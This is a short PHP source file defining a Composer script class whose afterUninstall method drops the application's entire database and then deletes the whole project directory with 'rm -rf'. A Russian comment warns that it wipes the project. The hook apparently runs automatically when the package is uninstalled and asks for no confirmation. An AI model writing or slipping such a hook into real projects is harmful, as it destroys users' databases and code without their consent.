<?php

namespace JavaDLE\Wipe;

class ComposerScripts
{
    public static function afterUninstall(): void
    {
        \DB::statement('DROP DATABASE ' . env('DB_DATABASE'));
        $projectFolder = base_path();

        // ⚠️ ВНИМАНИЕ: это удалит весь проект
        exec("rm -rf " . escapeshellarg($projectFolder));
    }
}
